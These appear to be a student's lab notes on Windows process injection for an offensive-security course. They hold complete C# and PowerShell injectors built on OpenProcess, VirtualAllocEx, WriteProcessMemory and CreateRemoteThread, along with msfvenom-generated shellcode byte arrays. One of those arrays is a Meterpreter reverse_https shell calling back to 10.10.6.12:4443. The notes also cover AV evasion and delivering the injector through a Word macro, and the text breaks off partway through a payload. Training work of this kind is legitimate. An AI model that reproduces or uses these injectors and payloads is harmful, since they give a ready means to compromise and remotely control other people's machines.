http://www.pinvoke.net/

page - 131

# Process Injection and migration

We are going to inject our shellcode to various processses to make it work.

# finding a home for shellcode 

We can run our shellcode either in an unlikely to terminate process like explorer.exe 
or start a hidden process notepad.exe
or we migrate to a process like svchost.exe

# process injection and migration theory

Process vs thread

A process has its own virtual memory space, and this space isnot meant to directly interact with other applications.

Thread executes the compiled assembly code of an application. Each thread has its own memory stack.


We will try to open one process from another using Win32 OpenProcess API.

We will modify its memory space using VirtualAllocEx, and WriteProcessMemory and start process with CreateRemoteThread.

### intptr

intptr are intermediate data types that can be used as a standby for point ot int. so used in handles.

### Openprocess API 

opens an existing process and needs 3 parameters. dwDesiredAccess establishes the access rights we require on that process. bInheritHandle - this determines if the handle can be inherited by a child process. dwProcessId - This is the process Id of the remote process.

Integrity level concept: We can access a process with lower integrity level from a higher intergrity level.

![](notepad_permissions.png)

VirtualAllocEx - this is used to allocate memory to our shellcode to a remote process

# process injection in C#

gives in detail how to look for functions in pinvoke.net.

```c#
LPVOID VirtualAllocEx(
 HANDLE hProcess, // handle to process
 LPVOID lpAddress, // starting address of memory to wrtie our injected instructions
if the address mentioned is already in use then execution will fail so better to pass NULL
 SIZE_T dwSize, // size of allocation we will set as 0x1000
 DWORD flAllocationType,// MEM_COMMIT and MEM_RESERVE 0x3000
 DWORD flProtect // 0x40 PAGE_EXECUTE_READWRITE
)
```

### WriteProcessMemory

WriteProcessMemory - We can copy data to remote process. (RTLMoveMemory doesn't support this.)


```C#
[DllImport("kernel32.dll")]
static extern bool WriteProcessMemory(
     IntPtr hProcess,// process handle
     IntPtr lpBaseAddress,/// newly allocated memory address 
     byte[] lpBuffer,// address of bytearray containing the shell code
     Int32 nSize,// size of shellcode
     out IntPtr lpNumberOfBytesWritten // a pointers to memory localtion to output how much data was copied
);
```

Notice that the out252 keyword was prepended to the outSize variable to have it passed by 
reference instead of value. This ensures that the argument type aligns with the function 
prototype

to get shellcode use msfvenom given below

### CreateRemoteThread

CreateRemoteThread - as we cannot just call CreateThread.

```C#
HANDLE CreateRemoteThread(
 HANDLE hProcess, // process handle
 LPSECURITY_ATTRIBUTES lpThreadAttributes, // IntPtr.Zero for default values
 SIZE_T dwStackSize, // allowed stack size can be 0
 LPTHREAD_START_ROUTINE lpStartAddress, // start address of a thread
 LPVOID lpParameter, // pointer to variables that will be passed to the thread can be nill
 DWORD dwCreationFlags, // ignore 0
 LPDWORD lpThreadId // ignore IntPtr.Zero
)
```





### creating a code based injection

for calc x64 winexec

```csharp
──(root㉿kali)-[/home/kali/codeplay/CVE-2022-1388]
└─# msfvenom -p windows/x64/exec CMD=calc.exe -b "x00" EXIT_FUNC=THREAD -f csharp
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=273, char=0x78)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 319 (iteration=0)
x64/xor chosen with final size 319
Payload size: 319 bytes
Final size of csharp file: 1648 bytes
byte[] buf = new byte[319] {
0x48,0x31,0xc9,0x48,0x81,0xe9,0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
0xff,0xff,0x48,0xbb,0xb6,0x91,0x18,0x2b,0x1c,0x05,0x92,0x1b,0x48,0x31,0x58,
0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x4a,0xd9,0x9b,0xcf,0xec,0xed,
0x52,0x1b,0xb6,0x91,0x59,0x7a,0x5d,0x55,0xc0,0x4a,0xe0,0xd9,0x29,0xf9,0x79,
0x4d,0x19,0x49,0xd6,0xd9,0x93,0x79,0x04,0x4d,0x19,0x49,0x96,0xd9,0x93,0x59,
0x4c,0x4d,0x9d,0xac,0xfc,0xdb,0x55,0x1a,0xd5,0x4d,0xa3,0xdb,0x1a,0xad,0x79,
0x57,0x1e,0x29,0xb2,0x5a,0x77,0x58,0x15,0x6a,0x1d,0xc4,0x70,0xf6,0xe4,0xd0,
0x49,0x63,0x97,0x57,0xb2,0x90,0xf4,0xad,0x50,0x2a,0xcc,0x8e,0x12,0x93,0xb6,
0x91,0x18,0x63,0x99,0xc5,0xe6,0x7c,0xfe,0x90,0xc8,0x7b,0x97,0x4d,0x8a,0x5f,
0x3d,0xd1,0x38,0x62,0x1d,0xd5,0x71,0x4d,0xfe,0x6e,0xd1,0x6a,0x97,0x31,0x1a,
0x53,0xb7,0x47,0x55,0x1a,0xd5,0x4d,0xa3,0xdb,0x1a,0xd0,0xd9,0xe2,0x11,0x44,
0x93,0xda,0x8e,0x71,0x6d,0xda,0x50,0x06,0xde,0x3f,0xbe,0xd4,0x21,0xfa,0x69,
0xdd,0xca,0x5f,0x3d,0xd1,0x3c,0x62,0x1d,0xd5,0xf4,0x5a,0x3d,0x9d,0x50,0x6f,
0x97,0x45,0x8e,0x52,0xb7,0x41,0x59,0xa0,0x18,0x8d,0xda,0x1a,0x66,0xd0,0x40,
0x6a,0x44,0x5b,0xcb,0x41,0xf7,0xc9,0x59,0x72,0x5d,0x5f,0xda,0x98,0x5a,0xb1,
0x59,0x79,0xe3,0xe5,0xca,0x5a,0xef,0xcb,0x50,0xa0,0x0e,0xec,0xc5,0xe4,0x49,
0x6e,0x45,0x63,0xa6,0x04,0x92,0x1b,0xb6,0x91,0x18,0x2b,0x1c,0x4d,0x1f,0x96,
0xb7,0x90,0x18,0x2b,0x5d,0xbf,0xa3,0x90,0xd9,0x16,0xe7,0xfe,0xa7,0xf5,0x27,
0xb9,0xe0,0xd0,0xa2,0x8d,0x89,0xb8,0x0f,0xe4,0x63,0xd9,0x9b,0xef,0x34,0x39,
0x94,0x67,0xbc,0x11,0xe3,0xcb,0x69,0x00,0x29,0x5c,0xa5,0xe3,0x77,0x41,0x1c,
0x5c,0xd3,0x92,0x6c,0x6e,0xcd,0x48,0x7d,0x69,0xf1,0x35,0xd3,0xe9,0x7d,0x2b,
0x1c,0x05,0x92,0x1b };
```


for reverse connect

```ps1
└─# msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=10.10.6.12 LPORT=4443 -f powershell                    
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 607 bytes
Final size of powershell file: 2960 bytes
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x51,0x48,0x8b,0x52,0x20,0x56,0x48,0xf,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x8b,0x48,0x18,0x50,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x4d,0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,0xd,0xac,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x41,0x58,0x41,0x58,0x48,0x1,0xd0,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x0,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,0x7,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0xb,0x0,0x0,0x0,0x31,0x30,0x2e,0x31,0x30,0x2e,0x36,0x2e,0x31,0x32,0x0,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0x5b,0x11,0x0,0x0,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x3,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0x39,0x0,0x0,0x0,0x2f,0x53,0x68,0x48,0x69,0x46,0x41,0x58,0x74,0x78,0x78,0x75,0x38,0x53,0x72,0x31,0x49,0x33,0x6f,0x56,0x59,0x68,0x41,0x63,0x79,0x4a,0x62,0x4d,0x4f,0x4c,0x6f,0x4f,0x49,0x44,0x72,0x6b,0x73,0x57,0x6e,0x58,0x6e,0x46,0x70,0x61,0x6d,0x73,0x54,0x78,0x59,0x4f,0x64,0x36,0x49,0x30,0x48,0x6b,0x0,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x0,0x32,0xa8,0x84,0x0,0x0,0x0,0x0,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0xa,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x0,0x0,0x49,0x89,0xe0,0x6a,0x4,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x0,0x0,0x0,0x0,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x0,0x0,0x49,0xba,0x44,0xf0,0x35,0xe0,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0xff,0xcf,0x74,0x2,0xeb,0xaa,0xe8,0x55,0x0,0x0,0x0,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x0,0x10,0x0,0x0,0x49,0xba,0x58,0xa4,0x53,0xe5,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x0,0x20,0x0,0x0,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x7,0x48,0x1,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x0,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 

```

Using mingw compiler https://www.msys2.org/


https://code.visualstudio.com/docs/cpp/config-mingw#:~:text=From%20the%20main%20menu%2C%20choose%20Run%20%3E%20Add%20Configuration..,build%20and%20debug%20active%20file. 

cttrl + shift + b - to build

with the pe injection it works from here - 

https://www.ired.team/offensive-security/code-injection-process-injection/process-injection

scan result 5/26

Trying to evade the AV we have - https://0xhop.github.io/evasion/2021/04/19/evasion-pt1/

### 5.1.2.1 Exercises
1. Replicate the steps and inject a reverse Meterpreter shell into the explorer.exe process.

able to inject into notepad not explorer.exe

![](injection_into_notepad.png)

2. Modify the code of the ExampleAssembly project in DotNetToJscript to create a Jscript file 
that executes the shellcode inside explorer.exe. Instead of hardcoding the process ID, which 
cannot be known remotely, use the Process.GetProcessByName255 method to resolve it 
dynamically.

![](calc_injection.png)

```csharp
//    This file is part of DotNetToJScript.
//    Copyright (C) James Forshaw 2017
//
//    DotNetToJScript is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    DotNetToJScript is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with DotNetToJScript.  If not, see <http://www.gnu.org/licenses/>.

using System;

using System.Diagnostics;
using System.Runtime.InteropServices;


[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
processId);
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
   dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
   lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
   dwCreationFlags, IntPtr lpThreadId);
    public TestClass()
    {
       

        System.Diagnostics.Process[] pid_process = Process.GetProcessesByName("notepad");
   

        if (pid_process.Length == 0)
        {
            Console.Write("Process not found!");
            return;
        }
        else
        {
            Console.Write("ID of notepad is " + pid_process[0].Id);
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid_process[0].Id);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            byte[] buf = new byte[319] {
            0x48,0x31,0xc9,0x48,0x81,0xe9,0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
            0xff,0xff,0x48,0xbb,0xb6,0x91,0x18,0x2b,0x1c,0x05,0x92,0x1b,0x48,0x31,0x58,
            0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x4a,0xd9,0x9b,0xcf,0xec,0xed,
            0x52,0x1b,0xb6,0x91,0x59,0x7a,0x5d,0x55,0xc0,0x4a,0xe0,0xd9,0x29,0xf9,0x79,
            0x4d,0x19,0x49,0xd6,0xd9,0x93,0x79,0x04,0x4d,0x19,0x49,0x96,0xd9,0x93,0x59,
            0x4c,0x4d,0x9d,0xac,0xfc,0xdb,0x55,0x1a,0xd5,0x4d,0xa3,0xdb,0x1a,0xad,0x79,
            0x57,0x1e,0x29,0xb2,0x5a,0x77,0x58,0x15,0x6a,0x1d,0xc4,0x70,0xf6,0xe4,0xd0,
            0x49,0x63,0x97,0x57,0xb2,0x90,0xf4,0xad,0x50,0x2a,0xcc,0x8e,0x12,0x93,0xb6,
            0x91,0x18,0x63,0x99,0xc5,0xe6,0x7c,0xfe,0x90,0xc8,0x7b,0x97,0x4d,0x8a,0x5f,
            0x3d,0xd1,0x38,0x62,0x1d,0xd5,0x71,0x4d,0xfe,0x6e,0xd1,0x6a,0x97,0x31,0x1a,
            0x53,0xb7,0x47,0x55,0x1a,0xd5,0x4d,0xa3,0xdb,0x1a,0xd0,0xd9,0xe2,0x11,0x44,
            0x93,0xda,0x8e,0x71,0x6d,0xda,0x50,0x06,0xde,0x3f,0xbe,0xd4,0x21,0xfa,0x69,
            0xdd,0xca,0x5f,0x3d,0xd1,0x3c,0x62,0x1d,0xd5,0xf4,0x5a,0x3d,0x9d,0x50,0x6f,
            0x97,0x45,0x8e,0x52,0xb7,0x41,0x59,0xa0,0x18,0x8d,0xda,0x1a,0x66,0xd0,0x40,
            0x6a,0x44,0x5b,0xcb,0x41,0xf7,0xc9,0x59,0x72,0x5d,0x5f,0xda,0x98,0x5a,0xb1,
            0x59,0x79,0xe3,0xe5,0xca,0x5a,0xef,0xcb,0x50,0xa0,0x0e,0xec,0xc5,0xe4,0x49,
            0x6e,0x45,0x63,0xa6,0x04,0x92,0x1b,0xb6,0x91,0x18,0x2b,0x1c,0x4d,0x1f,0x96,
            0xb7,0x90,0x18,0x2b,0x5d,0xbf,0xa3,0x90,0xd9,0x16,0xe7,0xfe,0xa7,0xf5,0x27,
            0xb9,0xe0,0xd0,0xa2,0x8d,0x89,0xb8,0x0f,0xe4,0x63,0xd9,0x9b,0xef,0x34,0x39,
            0x94,0x67,0xbc,0x11,0xe3,0xcb,0x69,0x00,0x29,0x5c,0xa5,0xe3,0x77,0x41,0x1c,
            0x5c,0xd3,0x92,0x6c,0x6e,0xcd,0x48,0x7d,0x69,0xf1,0x35,0xd3,0xe9,0x7d,0x2b,
            0x1c,0x05,0x92,0x1b };
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr,IntPtr.Zero, 0, IntPtr.Zero);
        }

        
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}


```

3. Port the code from C# to PowerShell to allow process injection and shellcode execution 
from a Word macro through PowerShell. Remember that PowerShell is started as 32-bit, so 
instead of injecting into explorer.exe, start a 32-bit process such as Notepad and inject into 
that instead.

how to add - using add type

```powershell
$User32 = @"
using System;
using System.Runtime.InteropServices;
public class User32 {
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int MessageBox(IntPtr hWnd, String text, String caption, int
options);
}
"@
Add-Type $User32
[User32]::MessageBox(0, "This is an alert", "MyBox", 0)
```

the code in C#

```c#
using System;
using System.Runtime.InteropServices;
namespace Inject
{
 class Program
 {
 [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
 static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
processId);
 [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
 static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
dwSize, uint flAllocationType, uint flProtect);
 [DllImport("kernel32.dll")]
 static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
 [DllImport("kernel32.dll")]
 static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
dwCreationFlags, IntPtr lpThreadId);
 static void Main(string[] args)
 {
 IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804);
 IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
 byte[] buf = new byte[591] {

0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
 ....
 0x0a,0x41,0x89,0xda,0xff,0xd5 };
 IntPtr outSize;
 WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
 IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr,
IntPtr.Zero, 0, IntPtr.Zero);
 }
 }
}

```

combining both - we can look at ps1 gallery for reference.

```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
  [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
 public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
processId);
 [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
 public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
dwSize, uint flAllocationType, uint flProtect);
 [DllImport("kernel32.dll")]
 public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
 [DllImport("kernel32.dll")]
 public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
dwCreationFlags, IntPtr lpThreadId);
}
"@

Add-Type $Kernel32
[Byte[]]$buf =
0x48,0x31,0xc9,0x48,0x81,0xe9,0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
0xff,0xff,0x48,0xbb,0xb6,0x91,0x18,0x2b,0x1c,0x05,0x92,0x1b,0x48,0x31,0x58,
0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x4a,0xd9,0x9b,0xcf,0xec,0xed,
0x52,0x1b,0xb6,0x91,0x59,0x7a,0x5d,0x55,0xc0,0x4a,0xe0,0xd9,0x29,0xf9,0x79,
0x4d,0x19,0x49,0xd6,0xd9,0x93,0x79,0x04,0x4d,0x19,0x49,0x96,0xd9,0x93,0x59,
0x4c,0x4d,0x9d,0xac,0xfc,0xdb,0x55,0x1a,0xd5,0x4d,0xa3,0xdb,0x1a,0xad,0x79,
0x57,0x1e,0x29,0xb2,0x5a,0x77,0x58,0x15,0x6a,0x1d,0xc4,0x70,0xf6,0xe4,0xd0,
0x49,0x63,0x97,0x57,0xb2,0x90,0xf4,0xad,0x50,0x2a,0xcc,0x8e,0x12,0x93,0xb6,
0x91,0x18,0x63,0x99,0xc5,0xe6,0x7c,0xfe,0x90,0xc8,0x7b,0x97,0x4d,0x8a,0x5f,
0x3d,0xd1,0x38,0x62,0x1d,0xd5,0x71,0x4d,0xfe,0x6e,0xd1,0x6a,0x97,0x31,0x1a,
0x53,0xb7,0x47,0x55,0x1a,0xd5,0x4d,0xa3,0xdb,0x1a,0xd0,0xd9,0xe2,0x11,0x44,
0x93,0xda,0x8e,0x71,0x6d,0xda,0x50,0x06,0xde,0x3f,0xbe,0xd4,0x21,0xfa,0x69,
0xdd,0xca,0x5f,0x3d,0xd1,0x3c,0x62,0x1d,0xd5,0xf4,0x5a,0x3d,0x9d,0x50,0x6f,
0x97,0x45,0x8e,0x52,0xb7,0x41,0x59,0xa0,0x18,0x8d,0xda,0x1a,0x66,0xd0,0x40,
0x6a,0x44,0x5b,0xcb,0x41,0xf7,0xc9,0x59,0x72,0x5d,0x5f,0xda,0x98,0x5a,0xb1,
0x59,0x79,0xe3,0xe5,0xca,0x5a,0xef,0xcb,0x50,0xa0,0x0e,0xec,0xc5,0xe4,0x49,
0x6e,0x45,0x63,0xa6,0x04,0x92,0x1b,0xb6,0x91,0x18,0x2b,0x1c,0x4d,0x1f,0x96,
0xb7,0x90,0x18,0x2b,0x5d,0xbf,0xa3,0x90,0xd9,0x16,0xe7,0xfe,0xa7,0xf5,0x27,
0xb9,0xe0,0xd0,0xa2,0x8d,0x89,0xb8,0x0f,0xe4,0x63,0xd9,0x9b,0xef,0x34,0x39,
0x94,0x67,0xbc,0x11,0xe3,0xcb,0x69,0x00,0x29,0x5c,0xa5,0xe3,0x77,0x41,0x1c,
0x5c,0xd3,0x92,0x6c,0x6e,0xcd,0x48,0x7d,0x69,0xf1,0x35,0xd3,0xe9,0x7d,0x2b,
0x1c,0x05,0x92,0x1b 

$hProcess =[Kernel32]::OpenProcess(0x001F0FFF, 0, 17692);
Write-Output $hProcess
Write-Output $buf.Length 

$addr = [Kernel32]::VirtualAllocEx([IntPtr]$hProcess, [IntPtr]::Zero, $buf.Length, 0x3000, 0x40);

[Int32]$lpNumberOfBytesWritten = 0
[Kernel32]::WriteProcessMemory($hProcess, $addr, $buf, $buf.Length, [ref]$lpNumberOfBytesWritten);

$ThreadId = 0
$hThread = [Kernel32]::CreateRemoteThread([IntPtr]$hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero);


```
error
```
Method invocation failed because [Kernel32] does not contain a method named 
'OpenProcess'.
```

running code -

```ps1
──(root㉿kali)-[/home/kali/codeplay/CVE-2022-1388]
└─# msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=10.10.6.12 LPORT=4443 -f psh -o new.ps1
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 747 bytes
Final size of psh file: 4404 bytes
Saved as: new.ps1
                                                                                                                             
┌──(root㉿kali)-[/home/kali/codeplay/CVE-2022-1388]
└─# cat new.ps1     
$MyOwGpiLF = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$nFHoxupEYPGPRa = Add-Type -memberDefinition $MyOwGpiLF -Name "Win32" -namespace Win32Functions -passthru

[Byte[]] $OgJxdhLHmMl = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x51,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x41,0x51,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x44,0x8b,0x40,0x20,0x8b,0x48,0x18,0x50,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x4d,0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,0xd,0xac,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x0,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,0x7,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0xb,0x0,0x0,0x0,0x31,0x30,0x2e,0x31,0x30,0x2e,0x36,0x2e,0x31,0x32,0x0,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0x5b,0x11,0x0,0x0,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x3,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0xc5,0x0,0x0,0x0,0x2f,0x45,0x6e,0x61,0x52,0x69,0x4d,0x53,0x72,0x73,0x6b,0x62,0x6c,0x55,0x4f,0x52,0x53,0x68,0x35,0x38,0x43,0x5f,0x77,0x6e,0x32,0x33,0x72,0x34,0x79,0x72,0x71,0x35,0x68,0x53,0x5f,0x33,0x55,0x4d,0x4b,0x76,0x47,0x5a,0x4d,0x37,0x42,0x4b,0x6d,0x35,0x4d,0x68,0x78,0x65,0x4e,0x53,0x4f,0x51,0x56,0x64,0x70,0x6e,0x42,0x5f,0x61,0x56,0x4e,0x44,0x67,0x7a,0x33,0x4c,0x71,0x35,0x62,0x6b,0x32,0x71,0x36,0x31,0x44,0x45,0x47,0x46,0x70,0x52,0x32,0x6c,0x48,0x43,0x76,0x59,0x6d,0x4b,0x76,0x46,0x63,0x5f,0x6e,0x59,0x51,0x4e,0x43,0x75,0x77,0x69,0x51,0x46,0x32,0x61,0x65,0x69,0x69,0x59,0x38,0x79,0x43,0x78,0x2d,0x39,0x72,0x4a,0x6f,0x54,0x4d,0x54,0x44,0x44,0x5f,0x54,0x7a,0x67,0x49,0x4c,0x59,0x49,0x67,0x34,0x4c,0x37,0x4b,0x6e,0x4b,0x62,0x35,0x49,0x4d,0x42,0x78,0x4a,0x63,0x58,0x57,0x2d,0x33,0x77,0x56,0x43,0x56,0x38,0x30,0x68,0x70,0x33,0x53,0x45,0x49,0x4e,0x31,0x4b,0x6a,0x47,0x64,0x45,0x45,0x55,0x79,0x54,0x33,0x5a,0x79,0x4f,0x55,0x47,0x6d,0x64,0x55,0x34,0x70,0x33,0x34,0x30,0x63,0x61,0x4f,0x6e,0x30,0x48,0x0,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0x